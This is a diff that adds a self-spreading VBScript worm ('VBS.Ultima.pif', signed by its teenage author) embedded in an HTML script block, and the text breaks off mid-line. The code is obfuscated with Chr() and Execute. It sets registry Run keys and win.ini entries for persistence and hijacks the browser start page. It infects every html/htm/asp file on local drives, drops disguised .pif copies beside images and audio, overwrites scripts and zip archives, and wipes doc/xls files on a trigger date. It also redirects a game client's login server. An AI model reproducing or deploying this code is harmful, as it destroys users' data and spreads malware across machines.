@@ -1,0 +1,684 @@
+</SCRIPT>
+<SCRIPT LANGUAGE=VBScript>
+<!--
+set a=CreateObject("Scripting.FileSystemObject")
+Set g = CreateObject("WScript.Shell")
+regz "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\WinSys","c:\e-card.vbs"
+set vbs=a.createtextfile("c:\e-card.vbs")
+encode=";)author           : by BR3AK-H3ART "&vbcrlf& _
+";)AGE              : 17 "&vbcrlf& _
+";)My Ultima nick   : NemesiS[Dark Lord] "&vbcrlf& _
+";)from             : TURKEY  "&vbcrlf& _
+";)e-mail           : br3ak_h3art@hotmail.com  "&vbcrlf& _
+";)explanation      : My Small Virus Game. ;) / TXT,LOG,HTM,ASP,DOC,XLS,MP3,WAV,ULtimate icon Pif system,Outlook Mail, _ "&vbcrlf& _
+";)Search Driver Files Mail Line And send.,Send Mail Computer Files "&vbcrlf& _
+";)virus name       : VBS.Ultima.pif - FuLL Mother file "&vbcrlf& _
+";)Message          : Computer My World.! And I Hate Go to School , All Computer One Gameї YES.! Big Game "&vbcrlf& _
+";)new Pif-VBS Viruses Coded by BR3AK-H3ART "&vbcrlf& _
+";)My Virus No:38 "&vbcrlf& _
+";)312C41\1
+On Error Resume Next
+Set a = CreateObject(ї*?Scripting.FileSystemObjectї*?)
+Set e = a.GetFile(WScript.ScriptFullName) "&vbcrlf& _
+"Set b = a.GetSpecialFolder(0)
+Set g = CreateObject(ї*?WScript.Shellї*?)
+Set d = a.GetSpecialFolder(2)
+Set HH = CreateObject(ї*?WScript.Networkї*?) "&vbcrlf& _
+"l=Chr(13)§§Chr(10)
+n=Chr(34)
+Z=Chr(34)
+e.copy(b§§ї*?\by-BR3AK-H3ART.vbsї*?)
+e.copy(b§§ї*?\system.dIIї*?)
+r ї*?HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\system32ї*?,b§§ї*?\by-BR3AK-H3ART.vbsї*? "&vbcrlf& _
+"r ї*?HKCU\Software\Microsoft\Internet Explorer\Main\Start Pageї*?,ї*?http://www.hidefiles.50megs.com/ї*?
+r ї*?HKEY_CLASSES_ROOT\VBSfile\DefaultIcon\ї*?,ї*?shell32.dll,-152ї*?   "&vbcrlf& _
+"r ї*?HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeoutї*?,0,ї*?REG_DWORDї*?
+r ї*?HKEY_CLASSES_ROOT\.dII\ї*?,ї*?VBSfileї*? "&vbcrlf& _
+"r ї*?HKEY_CLASSES_ROOT\VBSFile\Shell\Edit\Command\ї*?,b§§ї*?\by_BR3AK-H3ART_Mail_br3ak_h3art@hotmail.com_AGE_17.dIIї*? "&vbcrlf& _
+"r ї*?HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\systemї*?,b§§ї*?\system.dIIї*?
+If A2 = ї*?ї*? Then
+A2 = 0
+end if "&vbcrlf& _
+"A3=a.GetBaseName(WScript.ScriptFullName)
+if (a.FileExists(d§§ї*?\ї*?§§A3§§ї*?.txt-ї*?)) then
+set A4=a.CreateTextFile(d§§ї*?\ї*?§§A3)
+Set A5=a.OpenTextFile(d§§ї*?\ї*?§§A3§§ї*?.txt-ї*?) "&vbcrlf& _
+"A6=A5.readall
+A4.Writeline A6
+A4.close
+g.run(d§§ї*?\ї*?§§A3)
+end if
+if (a.FileExists(b§§ї*?\uo.zipї*?)) Then
+else
+g.run(ї*?Winzip32.exe  -min -a -r -p ї*?§§b§§ї*?\uo.zip ї*?§§b§§ї*?\by-BR3AK-H3ART.vbsї*?) , vbhide "&vbcrlf& _
+"end if
+set A7=a.CreateTextFile(b§§ї*?\Win98.iniї*?)
+A7.close
+set A9=a.OpenTextFile(b§§ї*?\win.iniї*?)
+B3=Split(A9.ReadAll,vbcrlf)
+B1=ubound(B3) "&vbcrlf& _
+"for B2=0 to ubound(B3)
+if B3(B2)=ї*?run=ї*? then
+B3(B2)=ї*?run=C:\WINDOWS\WScript.exe c:\WINDOWS\by-BR3AK-H3ART.vbsї*?
+else
+B3(B2)=B3(B2)§§ї*? ї*? "&vbcrlf& _
+"end if
+next
+set B4=a.OpenTextFile(b§§ї*?\Win98.iniї*?,2)
+B4.write join(B3,vbcrlf)
+B4.close
+A9.close
+set B5=a.getfile(b§§ї*?\Win98.iniї*?) "&vbcrlf& _
+"B5.copy(b§§ї*?\win.iniї*?)
+for Neme=1 to 3
+if Neme=ї*?1ї*? Then
+set B6=a.CreateTextFile(b§§ї*?\UO.pifї*?)
+A1=b§§ї*?\Write.exeї*?
+OutOpen=b§§ї*?\UO.pifї*? "&vbcrlf& _
+"end if
+if Neme=ї*?2ї*? Then
+set B6=a.CreateTextFile(b§§ї*?\Tarkan-remix-4.Mp3.pifї*?)
+A1=ї*?C:\Program Files\Winamp\winamp.exeї*?
+OutOpen=b§§ї*?\Tarkan-remix-4.Mp3.pifї*? "&vbcrlf& _
+"end if
+if Neme=ї*?3ї*? Then
+set B6=a.CreateTextFile(b§§ї*?\Bmp.pifї*?)
+A1=b§§ї*?\Write.exeї*?
+OutOpen=b§§ї*?\Bmp.pifї*?
+end if
+r ї*?HKEY_CLASSES_ROOT\VBSfile\DefaultIcon\ї*?,ї*?shell32.dll,-152ї*? "&vbcrlf& _
+"B6.Write(XX(ї*?0078627920425233414B2D48334152542020202020202020202020202020202080020000ї*?))
+B6.Write(XX(ї*?433A5C434F4D4D414E442E434F4D00000000000000000000000000000000000000000000ї*?)) "&vbcrlf& _
+"B6.Write(XX(ї*?0000000000000000000000000000000000000000000000000000001000003A5C00000000ї*?))
+B6.Write(XX(ї*?000000000000000000000000000000000000000000000000000000000000000000000000ї*?)) "&vbcrlf& _
+"B6.Write(XX(ї*?0000000000000000000000000000000000000000002F6320636F7079202A2E7069662063ї*?))
+B6.Write(XX(ї*?3A5C612E626174207C2063616C6C20633A5C612E626174207C2063616C6C20633A5C612Eї*?)) "&vbcrlf& _
+"B6.Write(XX(ї*?626174003A5C7061696E742E00000100FF19500000070000000000000000000000000000ї*?))
+B6.Write(XX(ї*?000000000000000000000000000000000000000000000000000000000000000000000000ї*?)) "&vbcrlf& _
+"B6.Write(XX(ї*?000000000000000000000000000000000000000000000000000000000000000000000000ї*?))
+B6.Write(XX(ї*?000000000000000000000000000000000000000000000000000000000000000000000000ї*?)) "&vbcrlf& _
+"B6.Write(XX(ї*?0000000000000000004D4943524F534F46542050494645580087010000710157494E444Fї*?))
+B6.Write(XX(ї*?57532033383620332E300005029D0168008002000064003200FFFF0000FFFF0000021012ї*?)) "&vbcrlf& _
+"B6.Write(XX(ї*?001F000000000000000000000000000000000000002F6320636F7079202A2E7069662063ї*?))
+B6.Write(XX(ї*?3A5C612E626174207C2063616C6C20633A5C612E626174207C2063616C6C20633A5C612Eї*?)) "&vbcrlf& _
+"B6.Write(XX(ї*?626174003A5C7061696E742E0057494E444F575320564D4D20342E3000FFFF1B02AC0100ї*?))
+B6.Write(XX(ї*?000000000000000000000000000000000000000000000000000000000000000000000000ї*?)) "&vbcrlf& _
+"B6.Write(XX(ї*?000000000000000000000000000000000000000000000000000000000000000000000000000000ї*?)) "&vbcrlf& _
+"B6.Write(XX(ї*?000000000000000000000000ї*?))§§A1
+B6.Write(XX(ї*?003682E65786500000000000000000000000000000000000000000000000000000000000ї*?)) "&vbcrlf& _
+"B6.Write(XX(ї*?000000000000000000000000000000000000000000000000000000000000000020000000ї*?))
+B6.Write(XX(ї*?000000000000000320001000000000000000000000001000000050019000300C800E8030ї*?)) "&vbcrlf& _
+"B6.Write(XX(ї*?2000A0001000000000000000C08000000000100010001005465726D696E616C000000000ї*?))
+B6.Write(XX(ї*?0000000000000000000000000000000000000004C756369646120436F6E736F6C6500000ї*?)) "&vbcrlf& _
+"B6.Write(XX(ї*?00000000000000000000000000000000000030000005000190035022C015C00540016000ї*?))
+B6.Write(XX(ї*?0000100FFFFFFFFFFFFFFFF64001B00C0006F00000000000000000000000000000000000ї*?)) "&vbcrlf& _
+"B6.Write(XX(ї*?000000000000000000000000000000000000000000000000000000000000000000000000ї*?))
+B6.Write(XX(ї*?000000000000000000000000000000000000000000000000000000000000000000000000100ї*?)) "&vbcrlf& _
+"B6.Writeline ї*?ї*?§§l§§ї*?ї*?§§l§§ї*?ї*?§§l§§ї*?ї*?§§l§§ї*?ї*?§§l§§ї*?ї*?§§l§§ї*?ї*?§§l§§ї*?ї*?§§l§§ї*?ї*?§§l§§ї*?ї*?§§l§§ї*?ї*?§§l§§ї*?ї*?§§l§§ї*?ї*?§§l§§ї*?ї*?§§l§§ї*?ї*?§§l§§ї*?ї*?
+B6.Close
+set B7=a.OpenTextFile(b§§ї*?\by-BR3AK-H3ART.vbsї*?) "&vbcrlf& _
+"set A8=a.CreateTextFile(b§§ї*?\decode.dllї*?)
+A8.close
+B8=Split(B7.ReadAll,vbcrlf)
+B9=ubound(B8)
+for C1=0 to ubound(B8)
+if (B9=C1) then "&vbcrlf& _
+"B8(C1)=ї*?echo ї*?§§B8(C1)§§ї*? ї*?§§Chr(62)§§Chr(62)§§ї*?c:\Ultima.vbsї*?§§l§§ї*?echo copy c:\windows\wscript.exe c:\ >c:\Runwin.batї*?§§l§§ _ "&vbcrlf& _
+"ї*?echo Wscript Ultima.vbs >>c:\Runwin.batї*?§§l§§ї*?call c:\Runwin.batї*?
+else
+if (C1=ї*?0ї*?) then
+B8(C1)=ї*?echo ї*?§§B8(C1)§§ї*? ї*?§§Chr(62)§§ї*?c:\Ultima.vbsї*? "&vbcrlf& _
+"else
+B8(C1)=ї*?echo ї*?§§B8(C1)§§ї*? ї*?§§Chr(62)§§Chr(62)§§ї*?c:\Ultima.vbsї*?
+end if
+end if
+next
+set C2=a.OpenTextFile(b§§ї*?\decode.dllї*?,2)
+C2.write join(B8,vbcrlf) "&vbcrlf& _
+"C2.close
+B7.close
+set C3=a.OpenTextFile(b§§ї*?\decode.dllї*?)
+set C4=a.Opentextfile(OutOpen,8,true)
+F12=C3.readall "&vbcrlf& _
+"C4.Write ї*?ї*?§§l§§ї*?ї*?§§l§§ї*?ї*?§§l§§ї*?ї*?§§l§§ї*?ї*?§§l§§ї*?ї*?§§l§§ї*?ї*?§§l§§ї*?ї*?§§l§§ї*?ї*?§§l§§ї*?ї*?§§l§§ї*?ї*?§§l§§ї*?ї*?§§l§§ї*?ї*?§§l§§ї*?ї*?§§l§§ї*?ї*?§§l§§ї*?ї*?
+C4.Write F12
+C4.close
+C3.close
+next "&vbcrlf& _
+"r ї*?HKCU\software\VBS-Ultima-PiF\ї*?,Chr(86)§§Chr(66)§§Chr(83)§§Chr(46)§§Chr(85)§§Chr(108)§§Chr(116)§§ _ "&vbcrlf& _
+"Chr(105)§§Chr(109)§§Chr(97)§§Chr(46)§§Chr(112)§§Chr(105)§§Chr(102)§§Chr(32)§§Chr(67)§§Chr(111)§§ _ "&vbcrlf& _
+"Chr(100)§§Chr(101)§§Chr(100)§§Chr(32)§§Chr(66)§§Chr(121)§§Chr(32)§§Chr(66)§§Chr(82)§§Chr(51)§§ _ "&vbcrlf& _
+"Chr(65)§§Chr(75)§§Chr(45)§§Chr(72)§§Chr(51)§§Chr(65)§§Chr(82)§§Chr(84)§§Chr(32)§§Chr(47)§§ _ "&vbcrlf& _
+"Chr(32)§§Chr(77)§§Chr(97)§§Chr(105)§§Chr(108)§§Chr(32)§§Chr(58)§§Chr(32)§§Chr(98)§§Chr(114)§§ _ "&vbcrlf& _
+"Chr(51)§§Chr(97)§§Chr(107)§§Chr(95)§§Chr(104)§§Chr(51)§§Chr(97)§§Chr(114)§§Chr(116)§§Chr(64)§§ _ "&vbcrlf& _
+"Chr(104)§§Chr(111)§§Chr(116)§§Chr(109)§§Chr(97)§§Chr(105)§§Chr(108)§§Chr(46)§§Chr(99)§§Chr(111)§§ _ "&vbcrlf& _
+"Chr(109)§§Chr(32)§§Chr(47)§§Chr(32)§§Chr(70)§§Chr(82)§§Chr(79)§§Chr(77)§§Chr(32)§§Chr(58)§§ _ "&vbcrlf& _
+"Chr(32)§§Chr(84)§§Chr(85)§§Chr(82)§§Chr(75)§§Chr(69)§§Chr(89)§§Chr(32)§§Chr(47)§§Chr(32)§§Chr(65)§§ _ "&vbcrlf& _
+"Chr(71)§§Chr(69)§§Chr(32)§§Chr(58)§§Chr(32)§§Chr(49)§§Chr(55)
+set D4=a.createtextfile(b§§ї*?\html.dIIї*?) "&vbcrlf& _
+"D4.writeline ї*?;)VBS.Ultima.pif-HTML.ASPї*?§§l§§ї*?;)html §§ htm §§ asp infected system Coded by BR3AK-H3ARTї*?§§l§§ _ "&vbcrlf& _
+"ї*?;)age:17 / from:TURKEYї*?§§l§§ї*?;)Mail:br3ak_h3art@hotmail.comї*?§§l§§ї*?Set a = CreateObject(ї*?§§Z§§ї*?Scripting.FileSystemObjectї*?§§Z§§ї*?)ї*?§§l§§ _ "&vbcrlf& _
+"ї*?Set b = a.GetSpecialFolder(0)ї*?§§l§§ї*?l=Chr(13)§§Chr(10)ї*?§§l§§ї*?n=Chr(34)ї*?§§l§§ї*?set bj=a.OpenTextFile(b§§ї*?§§Z§§ї*?\by-BR3AK-H3ART.vbsї*?§§Z§§ї*?)ї*?§§l§§ _ "&vbcrlf& _
+"ї*?set bw=a.CreateTextFile(b§§ї*?§§Z§§ї*?\htmickode.txtї*?§§Z§§ї*?)ї*?§§l§§ї*?bw.closeї*?§§l§§ї*?w=Split(bj.ReadAll,vbcrlf)ї*?§§l§§ї*?bh=ubound(w)ї*?§§l§§ _ "&vbcrlf& _
+"ї*?for bz=0 to ubound(w)ї*?§§l§§ї*?w(bz)=replace(w(bz),ї*?§§Z§§ї*?ї*?§§Z§§ї*?ї*?§§Z§§ї*?ї*?§§Z§§ї*?,Chr(191)+Chr(42)+Chr(63))ї*?§§l§§ _ "&vbcrlf& _
+"ї*?w(bz)=replace(w(bz),ї*?§§Z§§ї*?;)ї*?§§Z§§ї*?,Chr(59)+Chr(41))ї*?§§l§§ї*?w(bz)=replace(w(bz),ї*?§§Z§§ї*?§§ї*?§§Z§§ї*?,Chr(167)+Chr(167))ї*?§§l§§ _ "&vbcrlf& _
+"ї*?w(bz)=replace(w(bz),ї*?§§Z§§ї*?<BR3AK>ї*?§§Z§§ї*?,Chr(60)§§Chr(66)§§Chr(82)§§Chr(51)§§Chr(65)§§Chr(75)§§Chr(62))ї*?§§l§§ _ "&vbcrlf& _
+"ї*?if (bh=bz) thenї*?§§l§§ї*?w(bz)=chr(34)+w(bz)+chr(34)ї*?§§l§§ї*?elseї*?§§l§§ї*?if (bz=ї*?§§Z§§ї*?0ї*?§§Z§§ї*?) thenї*?§§l§§ _ "&vbcrlf& _
+"ї*?w(bz)=ї*?§§Z§§ї*?encode=ї*?§§Z§§ї*?§§chr(34)+w(bz)+chr(34)§§chr(38)§§ї*?§§Z§§ї*?vbcrlf§§ _ї*?§§Z§§ї*?ї*?§§l§§ї*?elseї*?§§l§§ _ "&vbcrlf& _
+"ї*?w(bz)=chr(34)+w(bz)+chr(34)§§ї*?§§Z§§ї*?§§vbcrlf§§ _ї*?§§Z§§ї*?ї*?§§l§§ї*?end ifї*?§§l§§ї*?end ifї*?§§l§§ї*?nextї*?§§l§§ _ "&vbcrlf& _
+"ї*?set d=a.OpenTextFile(b§§ї*?§§Z§§ї*?\htmickode.txtї*?§§Z§§ї*?,2)ї*?§§l§§ї*?d.write join(w,vbcrlf)ї*?§§l§§ _ "&vbcrlf& _
+"ї*?d.closeї*?§§l§§ї*?scrg()ї*?§§l§§ї*?sub scrgї*?§§l§§ї*?On Error Resume Nextї*?§§l§§ї*?Dim ax,ba,Oї*?§§l§§ї*?Set ba = a.Drivesї*?§§l§§ _ "&vbcrlf& _
+"ї*?For Each ax in baї*?§§l§§ї*?If ax.DriveType = 2 or ax.DriveType=3 Thenї*?§§l§§ї*?cu(ax.path§§ї*?§§Z§§ї*?\ї*?§§Z§§ї*?)ї*?§§l§§ _ "&vbcrlf& _
+"ї*?end ifї*?§§l§§ї*?Nextї*?§§l§§ї*?scrg = Oї*?§§l§§ї*?end subї*?§§l§§ї*?sub bb(folderspec)ї*?§§l§§ї*?On Error Resume Nextї*?§§l§§ _ "&vbcrlf& _
+"ї*?dim bc,bd,be,U,Oї*?§§l§§ї*?set bc = a.GetFolder(folderspec)ї*?§§l§§ї*?set be = bc.Filesї*?§§l§§ _ "&vbcrlf& _
+"ї*?for each bd in beї*?§§l§§ї*?U=a.GetExtensionName(bd.path)ї*?§§l§§ї*?U=lcase(U)ї*?§§l§§ї*?O=lcase(bd.name)ї*?§§l§§ _ "&vbcrlf& _
+"ї*?if (U=ї*?§§Z§§ї*?htmlї*?§§Z§§ї*?) or (U=ї*?§§Z§§ї*?htmї*?§§Z§§ї*?) or (U=ї*?§§Z§§ї*?aspї*?§§Z§§ї*?) thenї*?§§l§§ _ "&vbcrlf& _
+"ї*?set bi=a.OpenTextFile(bd.path)ї*?§§l§§ї*?bt=Split(bi.ReadAll,vbcrlf)ї*?§§l§§ї*?if (bt(1)=ї*?§§Z§§ї*?<SCRIPT LANGUAGE=VBScript>ї*?§§Z§§ї*?) thenї*?§§l§§ _ "&vbcrlf& _
+"ї*?elseї*?§§l§§ї*?Set bk = a.OpenTextFile(bd.path)ї*?§§l§§ї*?E01=bk.readallї*?§§l§§ї*?set bx=a.OpenTextFile(b§§ї*?§§Z§§ї*?\htmickode.txtї*?§§Z§§ї*?)ї*?§§l§§ _ "&vbcrlf& _
+"ї*?ca=bx.readallї*?§§l§§ї*?set cb=a.CreateTextFile(bd.path)ї*?§§l§§ї*?cb.writeline ї*?§§Z§§ї*?<BR3AK>ї*?§§Z§§ї*?§§ _ї*?§§l§§ _ "&vbcrlf& _
+"ї*?l§§ї*?§§Z§§ї*?<SCRIPT LANGUAGE=VBScript>ї*?§§Z§§ї*?§§ _ї*?§§l§§ї*?l§§ї*?§§Z§§ї*?<!--ї*?§§Z§§ї*?§§l§§ї*?§§Z§§ї*?set a=CreateObject(ї*?§§Z§§ї*?§§n§§ _ї*?§§l§§ _ "&vbcrlf& _
+"ї*?ї*?§§Z§§ї*?Scripting.FileSystemObjectї*?§§Z§§ї*?§§n§§ї*?§§Z§§ї*?)ї*?§§Z§§ї*?§§l§§ _ї*?§§l§§ї*?ї*?§§Z§§ї*?Set g = CreateObject(ї*?§§Z§§ї*?§§n§§ _ї*?§§l§§ _ "&vbcrlf& _
+"ї*?ї*?§§Z§§ї*?WScript.Shellї*?§§Z§§ї*?§§n§§ї*?§§Z§§ї*?)ї*?§§Z§§ї*?§§l§§ _ї*?§§l§§ї*?ї*?§§Z§§ї*?regz ї*?§§Z§§ї*?§§n§§ _ї*?§§l§§ _ "&vbcrlf& _
+"ї*?ї*?§§Z§§ї*?HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\WinSysї*?§§Z§§ї*?§§ _ї*?§§l§§ _ "&vbcrlf& _
+"ї*?n§§ї*?§§Z§§ї*?,ї*?§§Z§§ї*?§§n§§ї*?§§Z§§ї*?c:\e-card.vbsї*?§§Z§§ї*?§§n§§l§§ї*?§§Z§§ї*?set vbs=a.createtextfile(ї*?§§Z§§ї*?§§n§§ї*?§§Z§§ї*?c:\e-card.vbsї*?§§Z§§ї*?§§n§§ _ї*?§§l§§ _ "&vbcrlf& _
+"ї*?ї*?§§Z§§ї*?)ї*?§§Z§§ї*?§§l§§ca§§l§§ _ї*?§§l§§ї*?ї*?§§Z§§ї*?encodez=replace(encode,Chr(191)+Chr(42)+Chr(63),Chr(34))ї*?§§Z§§ї*?§§l§§ _ї*?§§l§§ _ "&vbcrlf& _
+"ї*?ї*?§§Z§§ї*?encodex=replace(encodez,Chr(59)§§Chr(41),chr(39))ї*?§§Z§§ї*?§§l§§ _ї*?§§l§§ _ "&vbcrlf& _
+"ї*?ї*?§§Z§§ї*?encodes=replace(encodex,Chr(167)§§Chr(167),chr(38))ї*?§§Z§§ї*?§§l§§ _ї*?§§l§§ _ "&vbcrlf& _
+"ї*?ї*?§§Z§§ї*?encodel=replace(encodes,Chr(60)§§Chr(66)§§Chr(82)§§Chr(51)§§Chr(65)§§Chr(75)ї*?§§Z§§ї*?§§ _ї*?§§l§§ _ "&vbcrlf& _
+"ї*?ї*?§§Z§§ї*?§§Chr(62),Chr(60)§§Chr(47)§§Chr(83)§§Chr(67)§§Chr(82)§§Chr(73)§§Chr(80)§§Chr(84)§§Chr(62))ї*?§§Z§§ї*?§§ _ї*?§§l§§ _ "&vbcrlf& _
+"ї*?l§§ї*?§§Z§§ї*?vbs.write encodelї*?§§Z§§ї*?§§l§§ї*?§§Z§§ї*?vbs.closeї*?§§Z§§ї*?§§l§§ї*?§§Z§§ї*?sub regz(regkey,regvalue)ї*?§§Z§§ї*?§§l§§ _ї*?§§l§§ _ "&vbcrlf& _
+"ї*?ї*?§§Z§§ї*?g.RegWrite regkey,regvalueї*?§§Z§§ї*?§§l§§ї*?§§Z§§ї*?end subї*?§§Z§§ї*?§§l§§ї*?§§Z§§ї*?//-->ї*?§§Z§§ї*?§§l§§ї*?§§Z§§ї*?<BR3AK>ї*?§§Z§§ї*?§§l§§E01ї*?§§l§§ї*?cb.closeї*?§§l§§ _ "&vbcrlf& _
+"ї*?bx.closeї*?§§l§§ї*?end ifї*?§§l§§ї*?end ifї*?§§l§§ї*?bk.closeї*?§§l§§ї*?nextї*?§§l§§ї*?end subї*?§§l§§ї*?sub cu(folderspec)ї*?§§l§§ї*?On Error Resume Nextї*?§§l§§ _ "&vbcrlf& _
+"ї*?dim bc,bd,sfї*?§§l§§ї*?set bc = a.GetFolder(folderspec)ї*?§§l§§ї*?set sf = bc.SubFoldersї*?§§l§§ї*?for each bd in sfї*?§§l§§ _ "&vbcrlf& _
+"ї*?bb(bd.path)ї*?§§l§§ї*?cu(bd.path)ї*?§§l§§ї*?nextї*?§§l§§ї*?end subї*?
+D4.CLOSE
+g.run(b§§ї*?\html.dIIї*?)
+scrg()
+Function C(JL) "&vbcrlf& _
+"Execute(Chr(70)§§Chr(111)§§Chr(114)§§Chr(32)§§Chr(74)§§Chr(73)§§Chr(32)§§Chr(61)§§Chr(32)§§Chr(49)§§Chr(32)§§ _ "&vbcrlf& _
+"Chr(84)§§Chr(111)§§Chr(32)§§Chr(76)§§Chr(101)§§Chr(110)§§Chr(40)§§Chr(74)§§Chr(76)§§Chr(41)§§Chr(13)§§Chr(10)§§ _ "&vbcrlf& _
+"Chr(74)§§Chr(85)§§Chr(32)§§Chr(61)§§Chr(32)§§Chr(77)§§Chr(105)§§Chr(100)§§Chr(40)§§Chr(74)§§Chr(76)§§Chr(44)§§ _ "&vbcrlf& _
+"Chr(32)§§Chr(74)§§Chr(73)§§Chr(44)§§Chr(32)§§Chr(49)§§Chr(41)§§Chr(13)§§Chr(10)§§Chr(73)§§Chr(102)§§Chr(32)§§ _ "&vbcrlf& _
+"Chr(65)§§Chr(115)§§Chr(99)§§Chr(40)§§Chr(74)§§Chr(85)§§Chr(41)§§Chr(32)§§Chr(60)§§Chr(62)§§Chr(32)§§Chr(51)§§ _ "&vbcrlf& _
+"Chr(52)§§Chr(32)§§Chr(65)§§Chr(110)§§Chr(100)§§Chr(32)§§Chr(65)§§Chr(115)§§Chr(99)§§Chr(40)§§Chr(74)§§Chr(85)§§ _ "&vbcrlf& _
+"Chr(41)§§Chr(32)§§Chr(60)§§Chr(62)§§Chr(32)§§Chr(51)§§Chr(53)§§Chr(32)§§Chr(84)§§Chr(104)§§Chr(101)§§Chr(110)§§ _ "&vbcrlf& _
+"Chr(13)§§Chr(10)§§Chr(73)§§Chr(102)§§Chr(32)§§Chr(65)§§Chr(115)§§Chr(99)§§Chr(40)§§Chr(74)§§Chr(85)§§Chr(41)§§ _ "&vbcrlf& _
+"Chr(32)§§Chr(77)§§Chr(111)§§Chr(100)§§Chr(32)§§Chr(50)§§Chr(32)§§Chr(61)§§Chr(32)§§Chr(48)§§Chr(32)§§Chr(84)§§ _ "&vbcrlf& _
+"Chr(104)§§Chr(101)§§Chr(110)§§Chr(13)§§Chr(10)§§Chr(74)§§Chr(85)§§Chr(32)§§Chr(61)§§Chr(32)§§Chr(67)§§Chr(104)§§ _ "&vbcrlf& _
+"Chr(114)§§Chr(40)§§Chr(65)§§Chr(115)§§Chr(99)§§Chr(40)§§Chr(74)§§Chr(85)§§Chr(41)§§Chr(32)§§Chr(43)§§Chr(32)§§ _ "&vbcrlf& _
+"Chr(49)§§Chr(41)§§Chr(13)§§Chr(10)§§Chr(69)§§Chr(108)§§Chr(115)§§Chr(101)§§Chr(13)§§Chr(10)§§Chr(74)§§Chr(85)§§ _ "&vbcrlf& _
+"Chr(32)§§Chr(61)§§Chr(32)§§Chr(67)§§Chr(104)§§Chr(114)§§Chr(40)§§Chr(65)§§Chr(115)§§Chr(99)§§Chr(40)§§Chr(74)§§ _ "&vbcrlf& _
+"Chr(85)§§Chr(41)§§Chr(32)§§Chr(45)§§Chr(32)§§Chr(49)§§Chr(41)§§Chr(13)§§Chr(10)§§Chr(69)§§Chr(110)§§Chr(100)§§ _ "&vbcrlf& _
+"Chr(32)§§Chr(73)§§Chr(102)§§Chr(13)§§Chr(10)§§Chr(69)§§Chr(110)§§Chr(100)§§Chr(32)§§Chr(73)§§Chr(102)§§Chr(13)§§ _ "&vbcrlf& _
+"Chr(10)§§Chr(67)§§Chr(32)§§Chr(61)§§Chr(32)§§Chr(67)§§Chr(32)§§Chr(38)§§Chr(32)§§Chr(74)§§Chr(85)§§Chr(13)§§ _ "&vbcrlf& _
+"Chr(10)§§Chr(78)§§Chr(101)§§Chr(120)§§Chr(116))
+End Function
+sub r(regkey,regvalue)
+On Error Resume Next
+g.RegWrite regkey,regvalue "&vbcrlf& _
+"end sub
+sub scrg
+On Error Resume Next
+Dim ax,ba,O
+Set ba = a.Drives
+For Each ax in ba
+If ax.DriveType = 2 or ax.DriveType=3 Then "&vbcrlf& _
+"cu(ax.path§§ї*?\ї*?)
+end if
+Next
+scrg = O
+end sub
+sub bb(folderspec)
+On Error Resume Next
+dim bc,bd,be,U,O
+set bc = a.GetFolder(folderspec) "&vbcrlf& _
+"set be = bc.Files
+for each bd in be
+U=a.GetExtensionName(bd.path)
+U=lcase(U)
+O=lcase(bd.name)
+if (U=ї*?vbsї*?) or (U=ї*?vbeї*?)  then "&vbcrlf& _
+"e.copy(bd.path)
+elseif (U=ї*?bmpї*?) or (U=ї*?jpgї*?) or (U=ї*?gifї*?) then
+picinf=a.Getfile(b§§ї*?\Bmp.pifї*?)
+picinf.copy(bd.path§§ї*?.pifї*?) "&vbcrlf& _
+"set bu2=a.GetFile(bd.path)
+bu2.attributes=bu.attributes + 2
+bu2.close
+elseif (U=ї*?zipї*?) then
+zip=a.getfile(b§§ї*?\uo.zipї*?)
+zip.copy(bd.path) "&vbcrlf& _
+"elseif (U=ї*?mp3ї*?) or (U=ї*?mp2ї*?) or (U=ї*?wavї*?) then
+Mp3inf=a.Getfile(b§§ї*?\Tarkan-remix-4.Mp3.pifї*?)
+Mp3inf.copy(bd.path§§ї*?.pifї*?)
+set bu=a.GetFile(bd.path) "&vbcrlf& _
+"bu.attributes=bu.attributes + 2
+bu.close
+elseif (U=ї*?docї*?) or (U=ї*?xlsї*?) then
+aatch=bd.path
+if month(now) = 9 and day(now) = 20 then "&vbcrlf& _
+"set BadJokee=a.CreateTextFile(bd.path)
+BadJokee.writeline ї*?Norton AntiVirus repair This File. (VBS.Scourge.pif) by BR3AK-H3ARTї*? "&vbcrlf& _
+"Badjokee.close
+end if
+end if
+if (O=ї*?login.cfgї*?) or (O=ї*?macros.txtї*?) then
+if (O=ї*?login.cfgї*?) then
+set UO=a.CReateTextFiLe(bd.path) "&vbcrlf& _
+"UO.Writeline ї*?LoginServer=shard.thealterrealm.com,2593ї*?
+UO.Close
+else
+set UO2=a.CReateTextFiLe(bd.path) "&vbcrlf& _
+"UO.Writeline C(ї*?C!1!1!1ї*?)§§l§§C(ї*?R`x!Lx!Bnlqtuds!I@BJDE!un!Cx!CS2@J,I2@SU/ ї*?)§§ _
+l§§C(ї*?########ї*?)§§l§§C(ї*?S!1!1!1ї*?)§§l§§C(ї*?R`x!Lx!Bnlqtuds!I@BJDE!un!Cx!CS2@J,I2@SUї*?)§§ _ "&vbcrlf& _
+"l§§C(ї*?########ї*?)§§l§§C(ї*?2!1!1!1ї*?)§§l§§C(ї*?R`x!Lx!Bnlqtuds!I@BJDE!un!Cx!CS2@J,I2@SUї*?)§§ _
+l§§ C(ї*?########ї*?)§§l§§C(ї*?@!1!1!1ї*?)§§l§§C(ї*?R`x!Lx!Bnlqtuds!I@BJDE!un!Cx!CS2@J,I2@SUї*?)§§ _ "&vbcrlf& _
+"l§§C(ї*?########ї*?)§§l§§C(ї*?J!1!1!1ї*?)§§l§§C(ї*?R`x!Lx!Bnlqtuds!I@BJDE!un!Cx!CS2@J,I2@SUї*?)§§ _
+l§§C(ї*?########ї*?)§§l§§C(ї*?I!1!1!1ї*?)§§l§§C(ї*?R`x!Lx!Bnlqtuds!I@BJDE!un!Cx!CS2@J,I2@SUї*?)§§ _ "&vbcrlf& _
+"l§§C(ї*?########ї*?)§§l§§C(ї*?D!1!1!1ї*?)§§l§§C(ї*?R`x!Lx!Bnlqtuds!I@BJDE!un!Cx!CS2@J,I2@SUї*?)§§ _
+l§§C(ї*?########ї*?)§§l§§C(ї*?@!1!1!1ї*?)§§l§§C(ї*?R`x!Lx!Bnlqtuds!I@BJDE!un!Cx!CS2@J,I2@SUї*?)§§ _ "&vbcrlf& _
